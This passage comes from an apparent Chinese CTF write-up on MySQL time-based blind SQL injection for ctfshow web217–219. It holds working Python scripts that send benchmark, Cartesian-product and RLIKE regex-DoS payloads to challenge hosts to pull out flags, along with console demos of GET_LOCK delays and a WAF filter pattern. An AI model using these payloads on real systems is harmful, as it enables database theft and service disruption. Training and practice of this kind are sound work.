class="number">1.72</span>s</span><br></pre></td></tr></table></figure><p>因此次数在脚本中需要多次调试。<br>而且由于这个时间是随着运行时间增长而会导致越到后面越不准确。<br>因此可以用limit关键字对flag进行分割。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://b78d98e8-2199-4723-bf89-18fed148eb42.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxccb&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaabc) from ctfshow_flagxccb),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),benchmark(2500000,sha(1)),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p>观察之前的flag<br><code>ctfshow&#123;c059a105-e0f9-41b5-a49e-002ac179386a&#125;</code><br>从第九位开始七位，从17开始10位 从28开始12位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">44n3955e</span><br><span class="line">-cec3-</span><br><span class="line">4c84-</span><br><span class="line">bb3f-</span><br><span class="line">91f5caab1040&#125;</span><br><span class="line">ctfshow&#123;44n3955e-cec3-4c84-bb3f-91f5caab1040&#125;</span><br><span class="line">44239p5d-cec3-4c84-bb3f-91f5caab1040fb</span><br><span class="line">4443955d</span><br></pre></td></tr></table></figure><p>这道太折磨人了做的要死了。 我操了 注三遍三个结果，破b脚本跑了3个小时，还是用大佬们的二分法跑吧，这个也太慢了。</p><h2 id="其他的时间盲注骚姿势"><a href="#其他的时间盲注骚姿势" class="headerlink" title="其他的时间盲注骚姿势"></a>其他的时间盲注骚姿势</h2><blockquote><p><a href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p></blockquote><h3 id="笛卡尔积盲注"><a href="#笛卡尔积盲注" class="headerlink" title="笛卡尔积盲注"></a>笛卡尔积盲注</h3><p>注入姿势</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br><span class="line">+-----------+</span><br><span class="line">| count(*)  |</span><br><span class="line">+-----------+</span><br><span class="line">| <span class="number">113101560</span> |</span><br><span class="line">+-----------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">2.07</span> sec)</span><br><span class="line"> </span><br><span class="line"> mysql&gt; select  <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">+------+-----+</span><br><span class="line">| user | pwd |</span><br><span class="line">+------+-----+</span><br><span class="line">| <span class="number">1</span>    | <span class="number">0</span>   |</span><br><span class="line">+------+-----+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">2.08</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select  <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span> <span class="keyword">and</span> (SELECT count() FROM information_schema.columns A, information_schema.columns B, information_schema.tables C);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.01</span> sec)</span><br></pre></td></tr></table></figure><p>利用and短路运算规则进行时间盲注。</p><h3 id="GET-LOCK盲注"><a href="#GET-LOCK盲注" class="headerlink" title="GET_LOCK盲注"></a>GET_LOCK盲注</h3><p>get_lock函数官方文档中的介绍<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689289973207-90f19c56-353b-4128-8a5c-9b65198645bf.png" alt="ZZAQbT.md.png"><br>可以看出文档中写的是我们如果已经开了一个session，对关键字进行了get_lock,那么再开另一个session再次对关键进行get_lock，就会延时我们指定的时间。<br>此盲注手法有一些限制，就是必须要同时开两个SESSION进行注入<br>SESSION A</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">1</span>) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       <span class="number">1</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>SESSION B</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">5</span>);</span><br><span class="line">+-------------------------+</span><br><span class="line">| get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">5</span>) |</span><br><span class="line">+-------------------------+</span><br><span class="line">|                       <span class="number">0</span> |</span><br><span class="line">+-------------------------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">5.00</span> sec)</span><br><span class="line"></span><br><span class="line"> mysql&gt; select * <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span>  get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">2.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * <span class="keyword">from</span> ctf_test where user=<span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">0</span> <span class="keyword">and</span>  get_lock(<span class="string">&#x27;lihuaiqiu&#x27;</span>,<span class="number">2</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>同样的盲注利用手法。</p><h3 id="正则DOS-RLIKE注入"><a href="#正则DOS-RLIKE注入" class="headerlink" title="正则DOS RLIKE注入"></a>正则DOS RLIKE注入</h3><p>延时原理，利用SQL多次计算正则消耗计算资源产生延时效果，其实原理是和我们的benchmark注入差不多的。<br>利用手法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select  <span class="keyword">from</span> flag where flag=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(mid(user(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;s&#x27;</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+b&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">+------+</span><br><span class="line">| flag |</span><br><span class="line">+------+</span><br><span class="line">| <span class="number">1</span>    |</span><br><span class="line">+------+</span><br><span class="line"><span class="number">1</span> row <span class="keyword">in</span> <span class="built_in">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select  <span class="keyword">from</span> flag where flag=<span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="keyword">if</span>(mid(user(),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">&#x27;r&#x27;</span>,concat(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&#x27;a&#x27;</span>)) RLIKE <span class="string">&#x27;(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+(a.)+cd&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">Empty <span class="built_in">set</span> (<span class="number">3.83</span> sec)</span><br></pre></td></tr></table></figure><h1 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h1><h3 id="笛卡尔乘积"><a href="#笛卡尔乘积" class="headerlink" title="笛卡尔乘积"></a>笛卡尔乘积</h3><p>benchmark也被禁用了，用笛卡尔积运算来达到延迟的目的<br>主要的语句是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B</span><br></pre></td></tr></table></figure><p>拼接到payload里面测试一下：<br>不够就一直加，加到有延迟为止。<br>就不一点点爆了，直接梭。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL时间盲注1.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/14 5:20   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://f277bdb1-e417-43a9-a241-8a77c0cdaeff.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;-&#125; &quot;</span></span><br><span class="line"><span class="comment"># inside = &#x27;database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(table_name) from information_schema.tables where table_schema = database()&#x27;</span></span><br><span class="line"><span class="comment"># inside = &#x27;select group_concat(column_name) from information_schema.columns where table_name = &quot;ctfshow_flagxc&quot;&#x27;</span></span><br><span class="line">inside = <span class="string">&#x27;substr((select group_concat(flagaac) from ctfshow_flagxc),9,36)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;1) or if(substr((&#123;&#125;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E,information_schema.schemata F),1)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: payload.<span class="built_in">format</span>(inside, i, j),</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># 看了Y4tacker佬的wp，看到这种写法，觉得太妙了。用try来微调</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            res += j</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> last == res.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>):</span><br><span class="line">            exit()</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="Rlike"><a href="#Rlike" class="headerlink" title="Rlike"></a>Rlike</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">select rpad(<span class="string">&#x27;a&#x27;</span>,<span class="number">4999999</span>,<span class="string">&#x27;a&#x27;</span>) RLIKE concat(repeat(<span class="string">&#x27;(a.*)+&#x27;</span>,<span class="number">30</span>),<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"></span><br><span class="line">正则语法：</span><br><span class="line">. : 匹配任意单个字符</span><br><span class="line">* ： 匹配<span class="number">0</span>个或多个前一个得到的字符</span><br><span class="line">[] : 匹配任意一个[]内的字符，[ab]*可匹配空串、a、b、或者由任意个a和b组成的字符串。</span><br><span class="line">^ : 匹配开头，如^s匹配以s或者S开头的字符串。</span><br><span class="line">$ : 匹配结尾，如s$匹配以s结尾的字符串。</span><br><span class="line">&#123;n&#125; : 匹配前一个字符反复n次。</span><br><span class="line"></span><br><span class="line">RPAD(<span class="built_in">str</span>,<span class="built_in">len</span>,padstr)</span><br><span class="line">用字符串 padstr对 <span class="built_in">str</span>进行右边填补直至它的长度达到 <span class="built_in">len</span>个字符长度，然后返回 <span class="built_in">str</span>。如果 <span class="built_in">str</span>的长度长于 <span class="built_in">len</span><span class="string">&#x27;，那么它将被截除到 len个字符。</span></span><br><span class="line"><span class="string">mysql&gt; SELECT RPAD(&#x27;</span>hi<span class="string">&#x27;,5,&#x27;</span>?<span class="string">&#x27;); -&gt; &#x27;</span>hi???<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">repeat(str,times)  复制字符串times次</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:孤桜懶契</span></span><br><span class="line"><span class="comment"># Date:2021/7/31</span></span><br><span class="line"><span class="comment"># blog: gylq.gitee.io</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">bypass=<span class="string">&quot;concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://4f04cb91-f6ed-43ce-bc4d-539d9c5b2a7b.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;01234567890abcdefghijklmnopqrstuvwxyz&#123;&#125;-()_,，&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)=&#x27;c&#x27;,( concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;),0)#</span></span><br><span class="line"><span class="comment">#求表payload = &quot;1) and  if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line"><span class="comment">#payload = &quot;1) and  if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;ctfshow_flagxc&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;1) and  if(substr((select group_concat(flagaac) from ctfshow_flagxc),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,(&#123;&#125;),0)#&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">666</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>: payload.<span class="built_in">format</span>(i,j,bypass),</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        start = time.time()</span><br><span class="line">        res = requests.post(url, data)</span><br><span class="line">        end = time.time()</span><br><span class="line">        <span class="keyword">if</span> end - start &gt; <span class="number">0.4</span> <span class="keyword">and</span> end - start &lt; <span class="number">1</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[*] 开始盲注第&#123;&#125;位&#x27;</span>.<span class="built_in">format</span>(n))</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;[*] flag is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(flag))</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h1 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//查询语句</span><br><span class="line">where <span class="built_in">id</span> = ($<span class="built_in">id</span>);</span><br><span class="line">//屏蔽危险分子</span><br><span class="line">function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/sleep|benchmark|rlike/i&#x27;</span>,$<span class="built_in">str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>同上题<br>直接跑就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 